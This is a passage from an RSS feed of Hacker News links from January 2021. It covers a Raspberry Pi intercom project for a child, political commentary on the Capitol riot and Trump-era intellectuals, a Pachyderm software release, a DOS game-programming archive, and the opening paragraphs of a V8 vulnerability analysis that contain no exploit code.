<p>The first time you run it you will need to give it a telegram bot key. Follow <a href="https://core.telegram.org/bots#3-how-do-i-create-a-bot" target="_blank" rel="noreferrer noopener">this steps</a> to create your instance of a Bot, and then run it with the <code>--setup-bot</code> flag and input the information the <em>BotFather</em> gave you.</p>



<p>You should now be able to search for the bot’s username in telegram and exchange some messages with it. You will first find that you get “not allowed” responses. The <strong>idea behind this bot is to exchange messages privately with just one user</strong>, so you have to tell the bot which is the allowed user id to interact with.</p>



<p>Take a look at the terminal where the bot is running, you will see some printed messages like this one:</p>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_user_id.png" alt="" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_user_id.png 571w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_user_id-300x66.png 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_user_id-100x22.png 100w" sizes="(max-width: 571px) 100vw, 571px"></figure></div>



<p>Copy your user-id from there and give it to the bot using the <code>--setup-user</code> flag.  You should now be able to send and receive voice messages, so we are ready to start with the physical part of the project.</p>







<h3>Raspberry pi HAT</h3>



<p>When doing a one-shot project like this I normally use breadboards or perfboards to assemble all the components. I used that approach a bunch of times in the past to handle a few backlitghted buttons, and the process was always frustrating: I ended up spending lots of time with the soldering and wiring of the components. So this time I decided to actually do what I promised myself each one of those times: design a <strong>breakout HAT for the raspberry with screw terminals where to easily connect everything.</strong></p>



<p>Since I was at it I added a darlington array and a number of selectable power sources in order to potentially handle bigger loads. I designed it in Kicad and then ordered a few PCBs. You can find the project files <a href="https://gitlab.com/daylanKifky/daddy-box-raspberry-pi-hat" target="_blank" rel="noreferrer noopener">here</a>.</p>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-1024x681.jpg" alt="" width="583" height="388" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-1024x681.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-300x199.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-768x511.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-640x425.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT-100x66.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_HAT.jpg 1053w" sizes="(max-width: 583px) 100vw, 583px"></figure></div>



<h3>Audio</h3>



<p>One little detail I wasn’t taking into consideration when I started the project was the fact that a <strong>raspberry pi doesn’t have an audio input</strong>.<strong> So I had to buy an USB microphone.</strong> A cheap one from a local store did the trick. I removed all the plastic parts and shortened the cable to avoid unnecessary EM interference.</p>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_mic.jpg" alt="" width="322" height="443" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_mic.jpg 581w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_mic-218x300.jpg 218w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_mic-349x480.jpg 349w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_mic-73x100.jpg 73w" sizes="(max-width: 322px) 100vw, 322px"></figure></div>



<p>Before using it I also tried a small USB audio card but I had a lot of conflicts being raised by <a rel="noreferrer noopener" href="http://people.csail.mit.edu/hubert/pyaudio/" target="_blank">pyaudio,</a> the library I used to handle the recording and playing of audio files in python.</p>



<p>For the audio output I connected a small speaker directly to the RPi audio output jack. The volume is a little low, but it gets the work done.</p>



<h3>Final assembly</h3>



<p>Once the PCBs and all the components arrived it was time to replace the <em>TUI</em> with a Button UI. I used the handy <a href="https://gpiozero.readthedocs.io/en/stable/" target="_blank" rel="noreferrer noopener">gpiozero</a> library to handle button press and leds. For the external case I used a shoe box to which I made holes for the buttons and speaker.</p>



<div>
<div>
<figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-1024x576.jpg" alt="" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-1024x576.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-300x169.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-768x432.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-640x360.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1-100x56.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly1.jpg 1422w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>




</div>



<div>
<figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-1024x576.jpg" alt="" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-1024x576.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-300x169.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-768x432.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-640x360.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2-100x56.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly2.jpg 1422w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
</div>
</div>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-1024x576.jpg" alt="" width="493" height="277" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-1024x576.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-300x169.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-768x432.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-640x360.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3-100x56.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assembly3.jpg 1422w" sizes="(max-width: 493px) 100vw, 493px"></figure></div>



<p>Once everything was set and tested I disassembled and packed all the components inside the box, wrapped the whole thing as a gift to prepare it for the best part.</p>



<h3>XMAS</h3>



<p>I gave the box as a present to my daughter to be opened on Christmas eve without telling her what the purpose of all those parts were. <strong>The next morning we spent a couple of hours putting it all together, so she discovered the purpose of the device, its final shape and got a glimpse of the internal functionality during the process.</strong></p>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-1024x576.jpg" alt="" width="510" height="286" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-1024x576.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-300x169.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-768x432.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-640x360.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid-100x56.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_assemblykid.jpg 1422w" sizes="(max-width: 510px) 100vw, 510px"></figure></div>



<p>When it was done my kid liked it way more than I could ever expect. What I conceived as an utilitary tool to keep us connected when I wasn’t close soon became a part of a game of exchanging messages about every little action in the everyday routine, even when we are just a few meters away 😅.&nbsp;</p>



<p>So I’m quite happy with the result. Not only did this object help strengthen our relationship, it ended up being a <strong>cool way to transmit the hacker-maker values and habits to a young mind.</strong></p>



<p>I hope some of you find this useful and if you try to build this at home I would love to know how it went for you, please share your experience in <a href="https://forum.chordata.cc/">our forum</a> using the <em>offtopic</em> tag.</p>



<p>And above all, have a great starting of the year!</p>



<figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-1024x576.jpg" alt="" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-1024x576.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-300x169.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-768x432.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-640x360.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final-100x56.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_final.jpg 1422w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
			</div><!-- .entry-content -->

			
		</div></div>]]>
            </description>
            <link>https://chordata.cc/blog/open-source-intercom-for-kids/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671919</guid>
            <pubDate>Thu, 07 Jan 2021 15:11:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Science vs. Engineering]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25671767">thread link</a>) | @sandes
<br/>
January 7, 2021 | http://santiagodebus.com/science-vs-engineering#2 | <a href="https://web.archive.org/web/*/http://santiagodebus.com/science-vs-engineering#2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://santiagodebus.com/science-vs-engineering#2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671767</guid>
            <pubDate>Thu, 07 Jan 2021 14:58:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[German Foreign Minister: Those Who Incite Bear Responsibility]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25671401">thread link</a>) | @dakna
<br/>
January 7, 2021 | https://www.spiegel.de/international/world/german-foreign-minister-heiko-maas-those-who-incite-bear-responsibility-a-9e808002-67ee-4175-93b0-a01bf8e6dde2 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/world/german-foreign-minister-heiko-maas-those-who-incite-bear-responsibility-a-9e808002-67ee-4175-93b0-a01bf8e6dde2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The images of the storming of the Capitol Building in Washington, D.C., are painful to the soul of every friend of democracy. The democratic world is shocked and appalled. But that’s not enough. We need all democrats around the world to stand shoulder to shoulder. The struggle against narrow-minded delusion, against intolerance, against the division of our societies is our common struggle. Indeed, it would be self-righteous to point the finger solely at America right now. Here in Germany, too, in <a target="_blank" rel="noopener noreferrer" href="https://www.spiegel.de/international/germany/when-far-right-hatred-turns-into-terrorism-a-e58ac378-bc7c-442e-a024-c801296d2b9c" data-link-flag="english">Hanau</a>, <a target="_blank" rel="noopener noreferrer" href="https://www.spiegel.de/international/germany/far-right-terrorism-in-germany-shooting-exposes-lapses-in-security-apparatus-a-1291075.html" data-link-flag="english">Halle </a>and on the steps of Reichstag (in coronavirus protests last summer), we have seen how agitation and inflammatory words can spark hateful deeds.</p><div>
<p>This should be extremely clear: Those who, like Trump, have spent years using words to constantly inflame and incite their own supporters, ultimately bear responsibility for this attack on the heart of American democracy. We see all around the world what happens when radical populists come to power and systematically stir up resentment against democratic institutions. Yes, democracy thrives on contradiction, even disagreement. But it dies when brute force silences the other, when sheer hatred breaks all bounds of decency and respect.</p><p>The radical mob does not represent the majority in the United States. The vast majority of American voters stand firmly behind democracy and voted decisively against a right-wing populist. And it’s not just Donald Trump who needs to finally accept that. Every Republican with a modicum of responsibility needs to finally repudiate Trump once and for all. The American courts have ruled clearly that this was a lawful election. Those who disrespect that election result are disrespecting their own people.</p>
</div><div>
<p>America’s strength is its diversity. It is admired around the world for the freedom of its democracy. U.S. president-elect Joe Biden knows this. His call yesterday for mutual respect and reconciliation were the soothing words of a president. And the confirmation of the election of Joe Biden and Kamala Harris by the U.S. Congress was the best democratic response to those who sowed chaos and discord in Washington yesterday.</p><p>As friends of America and as friends of democracy, we wish Joe Biden and Kamala Harris great strength in the difficult task of overcoming America’s division. We stand together with them in the fight for democracy. In keeping with the quintessential American motto: "E pluribus unum" – out of many, one.</p>
<p><span><svg aria-labelledby="title-94d5aab7-8f65-48c6-b3cc-3cb64f234849" width="10" height="20" viewBox="0 0 10 20" fill="none" xmlns="http://www.w3.org/2000/svg" role="img"><title id="title-94d5aab7-8f65-48c6-b3cc-3cb64f234849">Icon: Der Spiegel</title><g id="l-s-flag-94d5aab7-8f65-48c6-b3cc-3cb64f234849"><path id="vector-94d5aab7-8f65-48c6-b3cc-3cb64f234849" d="M9.85 16.293v-8H3.212V4.667h3.533v2.24h3.212v-3.2C9.85 2.747 8.993 2 8.03 2H1.713C.749 2 0 2.747 0 3.707v7.253h6.638v4.373H3.105v-2.986H0v3.84c0 .96.75 1.706 1.713 1.706H8.03c.963.107 1.82-.64 1.82-1.6z" fill="#000"></path></g></svg>
</span>
</p></div></div>]]>
            </description>
            <link>https://www.spiegel.de/international/world/german-foreign-minister-heiko-maas-those-who-incite-bear-responsibility-a-9e808002-67ee-4175-93b0-a01bf8e6dde2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671401</guid>
            <pubDate>Thu, 07 Jan 2021 14:30:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The links between the Trump administration and critical theory]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25671391">thread link</a>) | @thinkingemote
<br/>
January 7, 2021 | https://outsidertheory.com/theorycels-in-trumpworld/ | <a href="https://web.archive.org/web/*/https://outsidertheory.com/theorycels-in-trumpworld/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As I have explored previously, various commentators in the early Trump era attempted to <a href="https://www.vox.com/features/2019/11/11/18273141/postmodernism-donald-trump-lyotard-baudrillard">link</a> the new president to the body of thought often known as “postmodern theory.” As a recap of this discussion, I will quote here from some of my <a href="https://arcdigital.media/the-irony-poisoner-88d3f15232b9">prior writing</a> on the subject:</p><p>“In early 2017 . . . Steve Bannon, a White House strategist at the time, <a href="https://www.washingtonpost.com/politics/top-wh-strategist-vows-a-daily-fight-for-deconstruction-of-the-administrative-state/2017/02/23/03f6b8da-f9ea-11e6-bf01-d47f8cf9b643_story.html">proclaimed</a> that the Trump administration would undertake the ‘deconstruction of the administrative state.’ Bannon’s invocation of this old buzzword of critical theory led to plenty of <a href="https://twitter.com/HeerJeet/status/834922404216360961">humorous</a> <a href="https://twitter.com/garymmorris/status/835132954712104962">Twitter takes</a>, many linking [deconstructive literary theorist Paul] de Man to Trump’s postmodern White House.</p><p>“Conservatives usually repudiate postmodernism, but this was not the first time an improbable alliance between these nemeses had been suggested. At least since a George W. Bush aide <a href="https://en.wikipedia.org/wiki/Reality-based_community">dismissed</a> ‘the reality-based community,’ the notion that there is a ‘<a href="https://arcdigital.media/the-rise-of-post-modern-conservatism-53cf8651b052">postmodern turn</a>’ on the right has gained a certain currency. Many have found further evidence of a synthesis of conservatism and postmodernism in certain glib pronouncements emerging out of the Trump orbit, from Kellyanne Conway’s ‘alternative facts’ to Rudy Giuliani’s ‘truth isn’t truth.’”</p><p>Now, as the Trump era draws to a close, I would like to discuss a more concrete and, in my view, more interesting aspect of the admittedly tenuous linkage between Trump and “theory.” This is the presence of several individuals in the orbit of his White House who, in contrast to “folk postmodernists” like Conway and Giuliani, have an intellectual background and a sustained interest in “theory.”</p><p>I will focus on three such figures, but first, I will consider one other with a powerful spectral presence in the Trump-aligned political realm: Andrew Breitbart. Breitbart died before Trump’s political rise, but the eponymous publication he founded became an unofficial house organ of Trump’s campaign as well as a feeder of staff to his administration. One <em>Breitbart</em> alumna who ended up in the White House will be my second subject: Julia Hahn, previously a student of philosophy and psychoanalysis. Next, I’ll consider Darren Beattie, a former Trump speechwriter who wrote a doctoral dissertation on Martin Heidegger. Finally, I’ll return briefly to the theoretical interests of the so-called “philosopher-CEO” Peter Thiel, who has made regular appearances in my writing in the past. Thiel was never part of Trump’s administration, but he was an influential supporter, delegate, convention speaker, and member of the transition team in 2016.</p><h4>Andrew Breitbart</h4><p>Breitbart deserves mention here because although he helped establish the negative tenor of much of the contemporary right’s attitude to “theory,” he also pointed towards a different relationship between right-wing insurgents and the body of thought referred to by that term. In his 2011 autobiography <em>Righteous Indignation</em>, Breitbart wrote about his induction into “cultural Marxism” in college, specifically the work of the Frankfurt School theorists Theodor Adorno, Max Horkheimer, and Herbert Marcuse, and his later realization that “it was everywhere, from the mainstream media to Hollywood to the educational system to the government.” He describes critical theory as a “mission to destroy society and culture using the Marxist dialectic.”</p><p>It is worth quoting Breitbart at greater length on this subject:</p><p>“[Critical theory] was . . . a theory of criticizing everyone and everything everywhere. It was an attempt to tear down the social fabric by using all the social sciences (sociology, psychology, economics, political science, etc.); it was an infinite and unending criticism of the status quo, adolescent rebellion against all established social rules and norms.”</p><p>This passage should be read against the grain of its overt anti-theory stance. Elsewhere, Breitbart tells us that American society and politics is controlled by the “Democrat-Media Complex,” the “the power structure of Hollywood, Washington, and New York,” which is infused with cultural Marxism. How does one respond to this? Presumably by way of  a “ruthless criticism of all that exists” – in other words, by using the methods that Breitbart views as the main vice of critical theory; perhaps, also, by engaging in “adolescent rebellion against all established social rules and norms,” which is to say, against the politically correct dogmas of hegemonic liberalism. (Breitbart’s publication, recall, went on to employ Milo Yiannopolous.)</p><p>This is the real task Breitbart sets for himself and for the American right, and in this way, he seeks to learn from the “cultural Marxists” he repudiates. This means learning from his enemies, the cultural Marxists, in order to defeat them, since “[a]s it stands, the Frankfurt School–taught left is fighting the political battle on both the political and the cultural battlefields. Conservatives are fighting it only on the political battlefield.” Breitbart’s famous motto, “Politics is downstream from culture,” proceeds from its founder’s belief that the right should embrace the approach he attributes to critical theory to reclaim the culture from the “Democrat-Media Complex.” (As is often noted, the motto is Breitbart’s spin on the work of the Italian political theorist Antonio Gramsci, a key figure in his “cultural Marxism” narrative.) To borrow the Hegelian terminology his Frankfurt School nemeses might find congenial, Breitbart set out to “negate the negation.”</p><p>What’s difficult to determine from <em>Righteous Indignation</em> is how fully Breitbart believes the just-so story he relates about a handful of relatively obscure philosophers single-handedly undermining American society by slowly meming their ideas into the mainstream through the universities. Perhaps this is a conscious act of mythmaking carried out in the service of Breitbart’s own meme warfare counterattack. Regardless, his ambivalent relationship to “theory” – both his primary antagonist and a crucial inspiration for his project – set the stage for later developments in the Trump era.</p><h4>Julia Hahn</h4><p>Julia Hahn is, as of the writing of this post, still Special Assistant to the President, having outlasted many other White House staffers. This includes the man who brought her into Trump’s orbit: Steve Bannon, Andrew Breitbart’s friend and successor at the media empire he launched. Hahn wrote for <em>Breitbart</em> throughout the 2016 primary and general elections, prior to entering the Trump administration. She was best known for her polemical coverage of establishment Republicans like Paul Ryan and for incendiary immigration reporting that repeatedly drew attention to crimes committed by immigrants.</p><p>What brings Hahn to our attention here, however, is her <a href="https://thepointmag.com/politics/uchicago-bannons-bannons-bannon/">prior career</a> as a student at the University of Chicago. Less than two years before taking a job at <em>Breitbart</em>, Hahn, as an undergraduate, appeared on a panel discussion at Chicago related to the work of Leo Bersani, a crucial figure in the development of queer theory. The video of this session is still available on <a href="https://youtu.be/39FMKMdoM18?t=2246">Youtube</a>. The moderator who introduces Hahn to the audience situates her research “at the intersection of psychoanalysis and post-Foucauldian philosophical inquiry” and explains that her senior thesis explores “how psychoanalysis reveals flaws in the neo-Kantian conception of autonomy.”</p><p>Hahn breaks the ice at the beginning of her presentation with a joke about anal sex (a theoretical interest of Bersani’s), then delivers a precisely argued reassessment of French social theorist Michel Foucault’s critique of Freudian psychoanalysis. For background, Foucault’s critique of psychoanalysis goes approximately as follows: Freud believed that by working through repressed desires in speech, suffering people might find relief from the harmful effects of repression; but according to Foucault, rather than offering liberation through the release of pent-up desires, psychoanalysis <em>produced</em> those desires as discursive phenomena available to be monitored by power for the purpose of social control; in this sense, it amounted to a new strategy of social discipline comparable to the Catholic confessional. Hahn’s goal is to nuance Foucault’s critique by showing that Freud anticipated some elements of it, and to propose a model of psychoanalysis that survives Foucauldian scrutiny. In the course of this discussion, Hahn argues that Foucault’s account of psychoanalysis as a technique of power does not truly discredit it. Power is unavoidable, she says; “the problem,” as she reads Foucault, “is when power becomes rigid, and leads to states of what he calls domination.”</p><p>Given Hahn’s later career, it’s hard not to hear a faint echo here of Andrew Breitbart’s attack on the “Democrat-Media Complex.” Perhaps someone deeply invested in Foucault’s criticism of the diffuse, invisible ways in which power is exercised in the modern world, as Hahn appeared to be, might find some appeal in Andrew Breitbart’s account of the full-spectrum liberal “domination” of education, entertainment, and other industries and institutions, just as Breitbart himself was unmistakably attracted to aspects of the “culture industry” critique of the Frankfurt School theorists he detested.</p><p>Hahn’s presentation gives the impression of a nuanced and even-handed style of thought that contrasts with her overtly propagandistic work for <em>Breitbart</em>. Yet her paper might be read as offering a preemptive retort to this criticism, which goes something like this: no doubt, <em>Breitbart</em> is a purveyor of political propaganda, just as Freudian psychoanalysis is a technique of power. But if, as Foucault argues (and Breitbart would concur), the operations of power are omnipresent, perhaps university lectures and subtle literary essays are no less propagandistic than incendiary anti-immigration screeds. Hence, just as, for Hahn, the investment of psychoanalysis in power relations does not discredit it, especially if it can offer a means for resisting “domination,” the same might be said of outrage clickbait. Indeed, the latter’s …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://outsidertheory.com/theorycels-in-trumpworld/">https://outsidertheory.com/theorycels-in-trumpworld/</a></em></p>]]>
            </description>
            <link>https://outsidertheory.com/theorycels-in-trumpworld/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671391</guid>
            <pubDate>Thu, 07 Jan 2021 14:29:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pachyderm 1.12 GA – New ways to aggregate data from multiple sources and more]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25671355">thread link</a>) | @PachydermInc
<br/>
January 7, 2021 | https://pachdm.com/3bg5UJw | <a href="https://web.archive.org/web/*/https://pachdm.com/3bg5UJw">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-content"><article><div><div><p><img src="https://pachdm.com/images/blog-images/Pachyderm-1-12-announcment.jpg" alt="Pachyderm 1.12 GA Announcement"></p><p>2020 was a crazy year, to say the least. That’s why we thought it best not to tempt fate by trying to squeeze in a major release during the last few weeks of December. And so, with a renewed sense of optimism, and 2020 now officially in the history books (hooray!), we’re excited to announce the release of Pachyderm 1.12.</p><p>Here’s a look at what’s new:</p><h3 id="new-pipeline-input-type-groups">New Pipeline Input Type: Groups</h3><p>Groups give you a brand new way to combine data from multiple sources on Pachyderm. Similar to a database <em>group-by</em>, <strong><a href="https://docs.pachyderm.com/latest/concepts/pipeline-concepts/datum/group/">Groups in Pachyderm</a></strong> are a special type of pipeline input that enables you to aggregate files from one or more Pachyderm repositories via a particular naming pattern. For example:</p><p><strong>Groups within a single repo</strong></p><pre><code>$ pachctl list file repo@master
/labs/patientID1-labID1.txt
/labs/patientID2-labID1.txt
/labs/patientID1-labID2.txt
/labs/patientID3-labID1.txt
</code></pre><p>By configuring our pipeline input type to <code>group</code> and defining our <code>capture group</code> to match on <code>patientID</code>, we can <strong>aggregate all of patientID1 lab results into a single datum</strong> and create separate datums for all of patient 2 and 3. Neat!</p><p>Where Pachyderm Groups really start to shine is when you want to combine data from multiple repos and return the result as a single datum to be processed independently. For example, imagine we have a retail department store chain with multiple stores and different repos storing purchase information, return information and store identity information:</p><p><strong>Groups using multiple repos</strong></p><pre><code>Repo 1: Purchases
/ORDERW078929_STOREID2.txt file 64B  
/ORDERW080231_STOREID5.txt file 65B  
...
</code></pre><pre><code>Repo 2: Returns
NAME                       TYPE SIZE 
/ORDERW080231_STOREID5.txt file 65B  
/ORDERW080520_STOREID1.txt file 65B  
...
</code></pre><pre><code>Repo 3: Stores
/STOREID1.txt file 85B  
/STOREID2.txt file 85B  
/STOREID3.txt file 84B
</code></pre><p>Let’s say we wanted to get a list of all transactions (purchases or returns) grouped by storeID. Thanks to the new Pachyderm Group input type, this is easy. We simply specify our matching criteria and let Pachyderm handle the rest.</p><p>For those familiar with Pachyderm <code>joins</code>, you might be wondering how groups are different? In a nutshell, <code>joins</code> will return a single datum per match. Groups, on the other hand, will return all matches as a single datum.</p><p><strong><a href="https://pachdm.com/3omRJX0">Try groups out for yourself with this great example.</a></strong></p><h3 id="automated-deferred-processing-with-triggers">Automated Deferred Processing with Triggers</h3><p>Another exciting addition to Pachyderm 1.12 is Triggers, which gives users greater control over how and when to process data.</p><p>Take our retail example from earlier. Throughout the day we have lots of transactions happening; for each transaction the company has to pay anywhere from 1-3% of the total plus a flat fee to the bank (aka interchange-rates). A Pachyderm Trigger could help reduce those costs by automatically deferring each transaction’s processing using a predefined set of criteria – For example, every night at 10pm, or in batches of 20.</p><p>Now, instead of paying a processing fee for each transaction, we only pay it once. Cha ching!</p><p><strong><a href="https://pachdm.com/3pPjWG6">Give Pachyderm Triggers a try.</a></strong></p><h3 id="pachyderm-112-enterprise-additions">Pachyderm 1.12 Enterprise Additions:</h3><p>Pachyderm Enterprise includes everything mentioned so far as well as a few other goodies:</p><ul><li><a href="https://pachdm.com/3be5i7c">Group support for OIDC</a></li><li>Auth-enabled Extract/Restore</li></ul><h3 id="other-noteworthy-items">Other Noteworthy Items:</h3><p><strong><a href="https://pachdm.com/35gQUYm">Improved Spouts</a></strong>
We re-architected spouts to improve stability and security while also making it easier to integrate with external data sources.</p><p><strong><a href="https://pachdm.com/2MxA0hm">New “outer joins”</a></strong>
Where inner joins in Pachyderm will only return matched results, outer joins will return a result regardless of whether there’s a match or not.</p><p><strong><a href="https://pachdm.com/35gkDAA"><code>pachctl list datum</code></a></strong>
Now includes a dry run option for testing glob patterns.</p><p><strong><a href="https://pachdm.com/2Xjun8S"><code>pachctl update pipeline</code></a></strong>
Now supports transactions.</p><p>Interested in learning more about Pachyderm? <strong><a href="https://pachdm.com/3ogNTP3">Schedule some time with one of our experts</a></strong></p></div></div></article></div></div>]]>
            </description>
            <link>https://pachdm.com/3bg5UJw</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671355</guid>
            <pubDate>Thu, 07 Jan 2021 14:27:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DOS Era PC Game Programmer's Encyclopedia]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25671184">thread link</a>) | @postit
<br/>
January 7, 2021 | http://qzx.com/pc-gpe/ | <a href="https://web.archive.org/web/*/http://qzx.com/pc-gpe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Welcome to the PC Game Programmer's Encyclopedia on the World Wide Web!</p>


<hr>





<hr>


<h2><a href="ftp://x2ftp.oulu.fi/pub/msdos/programming/gpe/" target="_top">PC-GPE archive</a></h2>

<h2>Download PC-GPE v1.0</h2>
	<p><a href="ftp://x2ftp.oulu.fi/pub/msdos/programming/gpe/pcgpe10.zip" target="_top">DOS</a>
	/ <a href="ftp://x2ftp.oulu.fi/pub/msdos/programming/gpe/wpcgpe10.zip" target="_top">Windows</a></p>

<h2>Download PC-GPE v1.0a Patch</h2>
	<p><a href="ftp://x2ftp.oulu.fi/pub/msdos/programming/gpe/patch10a.txt" target="_top">DOS</a></p>


<hr>


<p>Special thanks go out to Mark Feldman for putting together the PC-GPE, and to all the
authors who contributed to PC-GPE. Thank you very much!</p>

<p><b>This page was created with the permission of
<a href="http://www.geocities.com/SiliconValley/2151/" target="_top">Mark Feldman</a>, the author of
<a href="http://www.geocities.com/SiliconValley/2151/pcgpe.html" target="_top">PC-GPE</a>.</b></p>


<hr>


<p>Visit
<a href="http://brix-os.sf.net/library" target="_top">http://brix-os.sf.net/library</a>
for more programming information.</p>


<hr>


<p><i>Created: 09/29/95 - Ben Wright</i></p>
<p><i>Modified: 8dec2001 - Brand Huntsman</i></p>

<hr><p><a href="http://qzx.com/"><img src="http://qzx.com/images/minilogo.gif" width="93" height="57" alt="QZx.com"></a></p></div></div>]]>
            </description>
            <link>http://qzx.com/pc-gpe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671184</guid>
            <pubDate>Thu, 07 Jan 2021 14:10:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing CVE-2020-16040]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25671152">thread link</a>) | @todsacerdoti
<br/>
January 7, 2021 | https://faraz.faith/2021-01-07-cve-2020-16040-analysis/ | <a href="https://web.archive.org/web/*/https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>
      <article role="main">
	      

<p>I recently analyzed a really cool N-day vulnerability in V8 and wanted to blog about it since I learned a lot while analyzing it.</p>



<p>On the 24th of November, a <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2557498">very interesting V8 commit</a> was made visible as part of <a href="https://crbug.com/1150649">Chromium Issue 1150649</a> (which is still restricted). The commit patched a bug in the Simplified Lowering Phase of V8’s optimizing JIT compiler, TurboFan. The latest version of V8 that this bug affects is version <strong>8.9.40</strong>. I will be using this as the unpatched version for analysis, and I will be comparing things like Turbolizer output against version <strong>8.9.41</strong>, where the bug is fixed.</p>

<p>The patch also included a nice regression test that showcased how to trigger the bug. It did not however grant any immediate exploitable primitives, so some work would need to be done to figure out whether the bug is exploitable at all (and how to exploit it).</p>

<p>Prior to analyzing this bug, I hadn’t really ever looked at the Simplified Lowering Phase in detail, so I took this as the perfect opportunity to learn about it. There was also the added benefit of having to look at all the optimization phases that come <em>after</em> the Simplified Lowering Phase in order to figure out whether this bug was exploitable or not. This would mean there would be tons of new things for me to learn, and that’s really all I aim for at the end of the day.</p>



